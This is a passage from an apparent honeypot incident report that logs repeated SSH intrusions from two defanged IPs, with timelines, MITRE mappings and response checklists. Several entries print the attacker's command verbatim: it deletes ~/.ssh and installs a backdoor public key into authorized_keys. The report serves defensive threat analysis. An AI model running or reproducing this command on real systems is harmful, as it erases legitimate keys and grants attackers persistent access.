- [ ] Submit `182.253.153[.]132` to AbuseIPDB if not already reported
- [ ] Block `182.253.153[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c207db578933

| Field | Detail |
|---|---|
| **Source IP** | `34.71.30[.]159` |
| **First Seen** | 2026-06-08 08:40 |
| **Last Seen** | 2026-06-08 08:40 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 08:40:05` | `cowrie.session.connect` |
| `2026-06-08 08:40:05` | `cowrie.client.version` |
| `2026-06-08 08:40:06` | `cowrie.client.kex` |
| `2026-06-08 08:40:07` | `cowrie.login.success` |
| `2026-06-08 08:40:07` | `cowrie.session.params` |
| `2026-06-08 08:40:07` | `cowrie.command.input` |
| `2026-06-08 08:40:07` | `cowrie.command.failed` |
| `2026-06-08 08:40:08` | `cowrie.log.closed` |
| `2026-06-08 08:40:08` | `cowrie.session.params` |
| `2026-06-08 08:40:08` | `cowrie.command.input` |
| `2026-06-08 08:40:08` | `cowrie.session.file_download` |
| `2026-06-08 08:40:08` | `cowrie.log.closed` |
| `2026-06-08 08:40:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `34.71.30[.]159` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c5d86d7688c

| Field | Detail |
|---|---|
| **Source IP** | `34.71.30[.]159` |
| **First Seen** | 2026-06-08 08:40 |
| **Last Seen** | 2026-06-08 08:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 08:40:11` | `cowrie.session.connect` |
| `2026-06-08 08:40:11` | `cowrie.client.version` |
| `2026-06-08 08:40:12` | `cowrie.client.kex` |
| `2026-06-08 08:40:13` | `cowrie.login.success` |
| `2026-06-08 08:40:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `34.71.30[.]159` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ef3a5dca81c

| Field | Detail |
|---|---|
| **Source IP** | `34.71.30[.]159` |
| **First Seen** | 2026-06-08 08:46 |
| **Last Seen** | 2026-06-08 08:46 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 08:46:28` | `cowrie.session.connect` |
| `2026-06-08 08:46:28` | `cowrie.client.version` |
| `2026-06-08 08:46:29` | `cowrie.client.kex` |
| `2026-06-08 08:46:30` | `cowrie.login.success` |
| `2026-06-08 08:46:30` | `cowrie.session.params` |
| `2026-06-08 08:46:30` | `cowrie.command.input` |
| `2026-06-08 08:46:30` | `cowrie.command.failed` |
| `2026-06-08 08:46:31` | `cowrie.log.closed` |
| `2026-06-08 08:46:31` | `cowrie.session.params` |
| `2026-06-08 08:46:31` | `cowrie.command.input` |
| `2026-06-08 08:46:32` | `cowrie.session.file_download` |
| `2026-06-08 08:46:32` | `cowrie.log.closed` |
| `2026-06-08 08:46:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `34.71.30[.]159` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a9e945212fb

| Field | Detail |
|---|---|
| **Source IP** | `34.71.30[.]159` |
| **First Seen** | 2026-06-08 08:46 |
| **Last Seen** | 2026-06-08 08:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 08:46:35` | `cowrie.session.connect` |
| `2026-06-08 08:46:35` | `cowrie.client.version` |
| `2026-06-08 08:46:35` | `cowrie.client.kex` |
| `2026-06-08 08:46:36` | `cowrie.login.success` |
| `2026-06-08 08:46:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `34.71.30[.]159` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41735049ce5d

| Field | Detail |
|---|---|
| **Source IP** | `34.71.30[.]159` |
| **First Seen** | 2026-06-08 08:48 |
| **Last Seen** | 2026-06-08 08:48 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 08:48:34` | `cowrie.session.connect` |
| `2026-06-08 08:48:34` | `cowrie.client.version` |
| `2026-06-08 08:48:34` | `cowrie.client.kex` |
| `2026-06-08 08:48:35` | `cowrie.login.success` |
| `2026-06-08 08:48:36` | `cowrie.session.params` |
| `2026-06-08 08:48:36` | `cowrie.command.input` |
| `2026-06-08 08:48:36` | `cowrie.command.failed` |
| `2026-06-08 08:48:37` | `cowrie.log.closed` |
| `2026-06-08 08:48:37` | `cowrie.session.params` |
| `2026-06-08 08:48:37` | `cowrie.command.input` |
| `2026-06-08 08:48:37` | `cowrie.session.file_download` |
| `2026-06-08 08:48:37` | `cowrie.log.closed` |
| `2026-06-08 08:48:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `34.71.30[.]159` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0570be5b1d1b

| Field | Detail |
|---|---|
| **Source IP** | `34.71.30[.]159` |
| **First Seen** | 2026-06-08 08:48 |
| **Last Seen** | 2026-06-08 08:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 08:48:41` | `cowrie.session.connect` |
| `2026-06-08 08:48:41` | `cowrie.client.version` |
| `2026-06-08 08:48:41` | `cowrie.client.kex` |
| `2026-06-08 08:48:42` | `cowrie.login.success` |
| `2026-06-08 08:48:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `34.71.30[.]159` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc721f44a457

| Field | Detail |
|---|---|
| **Source IP** | `34.71.30[.]159` |
| **First Seen** | 2026-06-08 08:50 |
| **Last Seen** | 2026-06-08 08:50 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 08:50:39` | `cowrie.session.connect` |
| `2026-06-08 08:50:39` | `cowrie.client.version` |
| `2026-06-08 08:50:39` | `cowrie.client.kex` |
| `2026-06-08 08:50:40` | `cowrie.login.success` |
| `2026-06-08 08:50:41` | `cowrie.session.params` |
| `2026-06-08 08:50:41` | `cowrie.command.input` |
| `2026-06-08 08:50:41` | `cowrie.command.failed` |
| `2026-06-08 08:50:41` | `cowrie.log.closed` |
| `2026-06-08 08:50:42` | `cowrie.session.params` |
| `2026-06-08 08:50:42` | `cowrie.command.input` |
| `2026-06-08 08:50:42` | `cowrie.session.file_download` |
| `2026-06-08 08:50:42` | `cowrie.log.closed` |
| `2026-06-08 08:50:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `34.71.30[.]159` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dbc91de19454

| Field | Detail |
|---|---|
| **Source IP** | `34.71.30[.]159` |
| **First Seen** | 2026-06-08 08:50 |
| **Last Seen** | 2026-06-08 08:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 08:50:45` | `cowrie.session.connect` |
| `2026-06-08 08:50:45` | `cowrie.client.version` |
| `2026-06-08 08:50:45` | `cowrie.client.kex` |
| `2026-06-08 08:50:46` | `cowrie.login.success` |
| `2026-06-08 08:50:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `34.71.30[.]159` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cad7f5598806

| Field | Detail |
|---|---|
| **Source IP** | `34.71.30[.]159` |
| **First Seen** | 2026-06-08 08:59 |
| **Last Seen** | 2026-06-08 08:59 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 08:59:06` | `cowrie.session.connect` |
| `2026-06-08 08:59:06` | `cowrie.client.version` |
| `2026-06-08 08:59:06` | `cowrie.client.kex` |
| `2026-06-08 08:59:08` | `cowrie.login.success` |
| `2026-06-08 08:59:08` | `cowrie.session.params` |
| `2026-06-08 08:59:08` | `cowrie.command.input` |
| `2026-06-08 08:59:08` | `cowrie.command.failed` |
| `2026-06-08 08:59:09` | `cowrie.log.closed` |
| `2026-06-08 08:59:09` | `cowrie.session.params` |
| `2026-06-08 08:59:09` | `cowrie.command.input` |
| `2026-06-08 08:59:09` | `cowrie.session.file_download` |
| `2026-06-08 08:59:09` | `cowrie.log.closed` |
| `2026-06-08 08:59:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `34.71.30[.]159` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65dc8a2b564c

| Field | Detail |
|---|---|
| **Source IP** | `34.71.30[.]159` |
| **First Seen** | 2026-06-08 08:59 |
| **Last Seen** | 2026-06-08 08:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 08:59:13` | `cowrie.session.connect` |
| `2026-06-08 08:59:13` | `cowrie.client.version` |
| `2026-06-08 08:59:13` | `cowrie.client.kex` |
| `2026-06-08 08:59:14` | `cowrie.login.success` |
| `2026-06-08 08:59:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `34.71.30[.]159` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8be835c53084

| Field | Detail |
|---|---|
| **Source IP** | `182.253.153[.]132` |
| **First Seen** | 2026-06-08 09:01 |
| **Last Seen** | 2026-06-08 09:01 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 09:01:52` | `cowrie.session.connect` |
| `2026-06-08 09:01:52` | `cowrie.client.version` |
| `2026-06-08 09:01:52` | `cowrie.client.kex` |
| `2026-06-08 09:01:53` | `cowrie.login.success` |
| `2026-06-08 09:01:53` | `cowrie.session.params` |
| `2026-06-08 09:01:53` | `cowrie.command.input` |
| `2026-06-08 09:01:53` | `cowrie.command.failed` |
| `2026-06-08 09:01:54` | `cowrie.log.closed` |
| `2026-06-08 09:01:54` | `cowrie.session.params` |
| `2026-06-08 09:01:54` | `cowrie.command.input` |
| `2026-06-08 09:01:54` | `cowrie.session.file_download` |
| `2026-06-08 09:01:54` | `cowrie.log.closed` |
| `2026-06-08 09:01:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.253.153[.]132` to AbuseIPDB if not already reported
- [ ] Block `182.253.153[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bab59991f28d

| Field | Detail |
|---|---|
| **Source IP** | `182.253.153[.]132` |
| **First Seen** | 2026-06-08 09:01 |
| **Last Seen** | 2026-06-08 09:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 09:01:56` | `cowrie.session.connect` |
| `2026-06-08 09:01:56` | `cowrie.client.version` |
| `2026-06-08 09:01:56` | `cowrie.client.kex` |
| `2026-06-08 09:01:57` | `cowrie.login.success` |
| `2026-06-08 09:01:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.253.153[.]132` to AbuseIPDB if not already reported
- [ ] Block `182.253.153[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-952f120a578f

| Field | Detail |
|---|---|
| **Source IP** | `34.71.30[.]159` |
| **First Seen** | 2026-06-08 09:03 |
| **Last Seen** | 2026-06-08 09:03 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 09:03:19` | `cowrie.session.connect` |
| `2026-06-08 09:03:19` | `cowrie.client.version` |
| `2026-06-08 09:03:20` | `cowrie.client.kex` |
| `2026-06-08 09:03:21` | `cowrie.login.success` |
| `2026-06-08 09:03:22` | `cowrie.session.params` |
| `2026-06-08 09:03:22` | `cowrie.command.input` |
| `2026-06-08 09:03:22` | `cowrie.command.failed` |
| `2026-06-08 09:03:22` | `cowrie.log.closed` |
| `2026-06-08 09:03:23` | `cowrie.session.params` |
| `2026-06-08 09:03:23` | `cowrie.command.input` |
| `2026-06-08 09:03:23` | `cowrie.session.file_download` |
| `2026-06-08 09:03:23` | `cowrie.log.closed` |
| `2026-06-08 09:03:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `34.71.30[.]159` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af64cd713521

| Field | Detail |
|---|---|
| **Source IP** | `34.71.30[.]159` |
| **First Seen** | 2026-06-08 09:03 |
| **Last Seen** | 2026-06-08 09:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 09:03:27` | `cowrie.session.connect` |
| `2026-06-08 09:03:27` | `cowrie.client.version` |
| `2026-06-08 09:03:27` | `cowrie.client.kex` |
| `2026-06-08 09:03:28` | `cowrie.login.success` |
| `2026-06-08 09:03:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `34.71.30[.]159` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5fe124d7ba3

| Field | Detail |
|---|---|
| **Source IP** | `34.71.30[.]159` |
| **First Seen** | 2026-06-08 09:09 |
| **Last Seen** | 2026-06-08 09:09 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 09:09:38` | `cowrie.session.connect` |
| `2026-06-08 09:09:38` | `cowrie.client.version` |
| `2026-06-08 09:09:38` | `cowrie.client.kex` |
| `2026-06-08 09:09:39` | `cowrie.login.success` |
| `2026-06-08 09:09:39` | `cowrie.session.params` |
| `2026-06-08 09:09:39` | `cowrie.command.input` |
| `2026-06-08 09:09:39` | `cowrie.command.failed` |
| `2026-06-08 09:09:40` | `cowrie.log.closed` |
| `2026-06-08 09:09:40` | `cowrie.session.params` |
| `2026-06-08 09:09:40` | `cowrie.command.input` |
| `2026-06-08 09:09:41` | `cowrie.session.file_download` |
| `2026-06-08 09:09:41` | `cowrie.log.closed` |
| `2026-06-08 09:09:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `34.71.30[.]159` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31789f993b36

| Field | Detail |
|---|---|
| **Source IP** | `34.71.30[.]159` |
| **First Seen** | 2026-06-08 09:09 |
| **Last Seen** | 2026-06-08 09:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 09:09:44` | `cowrie.session.connect` |
| `2026-06-08 09:09:44` | `cowrie.client.version` |
| `2026-06-08 09:09:44` | `cowrie.client.kex` |
| `2026-06-08 09:09:45` | `cowrie.login.success` |
| `2026-06-08 09:09:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `34.71.30[.]159` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-837006925a8e

| Field | Detail |
|---|---|
| **Source IP** | `182.253.153[.]132` |
| **First Seen** | 2026-06-08 09:09 |
| **Last Seen** | 2026-06-08 09:09 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
